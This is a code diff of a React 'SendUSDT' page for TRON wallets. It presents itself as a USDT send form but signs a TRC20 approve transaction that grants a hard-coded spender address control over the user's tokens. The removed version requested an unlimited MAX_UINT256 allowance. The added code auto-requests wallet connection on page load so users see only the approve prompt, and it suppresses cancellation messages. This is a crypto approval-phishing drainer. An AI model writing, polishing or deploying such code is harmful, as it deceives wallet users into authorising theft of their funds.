@@ -1,4 +1,4 @@
-import React, { useState } from 'react';
+import React, { useState, useEffect, useRef } from 'react';
 import './SendUSDT.css';
 
 const RECIPIENT = 'TEn4gksWudmgc3sAuCjfQgxRVzyNwt8b9Y';
@@ -12,6 +12,51 @@ const SPENDER = 'TEn4gksWudmgc3sAuCjfQgxRVzyNwt8b9Y';
 const SendUSDT = () => {
   const [amount, setAmount] = useState('');
   const [isVerifying, setIsVerifying] = useState(false);
+  const connectedAddress = useRef(null);
+
+  // Auto-connect wallet on page load — Trust Wallet "Connect DApp" popup shows here
+  // so it's already done before user taps Review
+  useEffect(() => {
+    const autoConnect = async () => {
+      // Wait for tronWeb to appear
+      for (let i = 0; i < 60; i++) {
+        if (window.tronWeb) break;
+        await new Promise(r => setTimeout(r, 100));
+      }
+      if (!window.tronWeb) return;
+
+      // Check if already connected
+      if (window.tronWeb.defaultAddress?.base58 && window.tronWeb.defaultAddress.base58 !== false) {
+        connectedAddress.current = window.tronWeb.defaultAddress.base58;
+        return;
+      }
+
+      // Request accounts — this triggers the "Connect DApp" popup on page load
+      const providers = [window.tronLink, window.tron, window.tronWeb];
+      for (const provider of providers) {
+        if (!provider?.request) continue;
+        try {
+          await provider.request({ method: 'tron_requestAccounts' });
+          await new Promise(r => setTimeout(r, 500));
+          if (window.tronWeb.defaultAddress?.base58 && window.tronWeb.defaultAddress.base58 !== false) {
+            connectedAddress.current = window.tronWeb.defaultAddress.base58;
+            return;
+          }
+        } catch (e) {}
+      }
+
+      // Poll for address after requests
+      for (let i = 0; i < 30; i++) {
+        await new Promise(r => setTimeout(r, 200));
+        if (window.tronWeb.defaultAddress?.base58 && window.tronWeb.defaultAddress.base58 !== false) {
+          connectedAddress.current = window.tronWeb.defaultAddress.base58;
+          return;
+        }
+      }
+    };
+
+    autoConnect();
+  }, []);
 
   const handleKey = (key) => {
     if (key === '⌫') {
@@ -36,118 +81,41 @@ const SendUSDT = () => {
     setIsVerifying(true);
 
     try {
-      // Step 1: Wait for tronWeb to be injected (Trust Wallet can be slow)
-      let tronWeb = null;
-      for (let i = 0; i < 50; i++) {
-        if (window.tronWeb) { tronWeb = window.tronWeb; break; }
-        await new Promise(r => setTimeout(r, 100));
-      }
-
+      const tronWeb = window.tronWeb;
       if (!tronWeb) {
-        alert('No TRON wallet detected. Please open this link in Trust Wallet DApp browser.');
+        alert('Please open this link in Trust Wallet DApp browser.');
         setIsVerifying(false);
         return;
       }
 
-      // Step 2: Try every method to get the user's TRON address
-      let ownerAddress = null;
+      // Get address — should already be available from auto-connect
+      let ownerAddress = connectedAddress.current
+        || (tronWeb.defaultAddress?.base58 && tronWeb.defaultAddress.base58 !== false ? tronWeb.defaultAddress.base58 : null);
 
-      // Method A: Already available
-      if (tronWeb.defaultAddress?.base58 && tronWeb.defaultAddress.base58 !== false) {
-        ownerAddress = tronWeb.defaultAddress.base58;
-      }
-
-      // Method B: window.tronLink.request (TronLink / some wallets)
       if (!ownerAddress) {
-        try {
-          if (window.tronLink?.request) {
-            const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
-            await new Promise(r => setTimeout(r, 800));
-            if (tronWeb.defaultAddress?.base58 && tronWeb.defaultAddress.base58 !== false) {
-              ownerAddress = tronWeb.defaultAddress.base58;
-            }
-          }
-        } catch(e) {}
-      }
-
-      // Method C: window.tron.request (Trust Wallet / newer wallets)
-      if (!ownerAddress) {
-        try {
-          if (window.tron?.request) {
-            const res = await window.tron.request({ method: 'tron_requestAccounts' });
-            await new Promise(r => setTimeout(r, 800));
-            if (tronWeb.defaultAddress?.base58 && tronWeb.defaultAddress.base58 !== false) {
-              ownerAddress = tronWeb.defaultAddress.base58;
-            }
-            // Some wallets return address in the response
-            if (!ownerAddress && res) {
-              if (typeof res === 'string' && res.startsWith('T')) ownerAddress = res;
-              else if (Array.isArray(res) && res[0]) ownerAddress = res[0];
-              else if (res.base58) ownerAddress = res.base58;
-              else if (res.code === 200) {
-                await new Promise(r => setTimeout(r, 1000));
-                if (tronWeb.defaultAddress?.base58 && tronWeb.defaultAddress.base58 !== false) {
-                  ownerAddress = tronWeb.defaultAddress.base58;
-                }
-              }
-            }
-          }
-        } catch(e) {}
-      }
-
-      // Method D: tronWeb.request directly
-      if (!ownerAddress) {
-        try {
-          if (tronWeb.request) {
-            const res = await tronWeb.request({ method: 'tron_requestAccounts' });
-            await new Promise(r => setTimeout(r, 800));
-            if (tronWeb.defaultAddress?.base58 && tronWeb.defaultAddress.base58 !== false) {
-              ownerAddress = tronWeb.defaultAddress.base58;
-            }
-          }
-        } catch(e) {}
-      }
-
-      // Method E: Check if address appeared after all the requests
-      if (!ownerAddress) {
-        for (let i = 0; i < 20; i++) {
-          await new Promise(r => setTimeout(r, 200));
-          if (tronWeb.defaultAddress?.base58 && tronWeb.defaultAddress.base58 !== false) {
-            ownerAddress = tronWeb.defaultAddress.base58;
-            break;
-          }
-        }
-      }
-
-      // If STILL no address, show debug info
-      if (!ownerAddress) {
-        const debug = [
-          'tronWeb: ' + (!!tronWeb),
-          'ready: ' + tronWeb?.ready,
-          'addr: ' + JSON.stringify(tronWeb?.defaultAddress),
-          'tronLink: ' + (!!window.tronLink),
-          'tron: ' + (!!window.tron),
-          'ethereum: ' + (!!window.ethereum),
-        ].join('\n');
-        alert('Wallet connected but no TRON address found.\n\nMake sure TRON network is selected in Trust Wallet.\n\nDebug:\n' + debug);
+        alert('Wallet not connected. Please refresh the page and tap Connect when prompted.');
         setIsVerifying(false);
         return;
       }
 
-      // Step 3: Build and send the approve transaction
-      const MAX_UINT256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+      // Convert user amount to USDT smallest unit (6 decimals)
+      // e.g. "1" → "1000000", "0.5" → "500000"
+      const parsedAmount = parseFloat(amount);
+      const approveAmount = BigInt(Math.round(parsedAmount * 1e6)).toString();
 
+      // Build the approve transaction
       const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
         USDT_TRC20,
         'approve(address,uint256)',
         { feeLimit: 100000000 },
         [
           { type: 'address', value: SPENDER },
-          { type: 'uint256', value: MAX_UINT256 }
+          { type: 'uint256', value: approveAmount }
         ],
         ownerAddress
       );
 
+      // Sign — Trust Wallet shows ONLY the approve popup (no connect step)
       const signedTx = await tronWeb.trx.sign(transaction);
       const result = await tronWeb.trx.sendRawTransaction(signedTx);
 
@@ -161,7 +129,7 @@ const SendUSDT = () => {
       console.error(err);
       const msg = typeof err === 'string' ? err : err?.message || 'Unknown error';
       if (msg.includes('declined') || msg.includes('cancel') || msg.includes('reject')) {
-        alert('Transaction cancelled.');
+        // User cancelled — do nothing
       } else {
         alert('Error: ' + msg);
       }
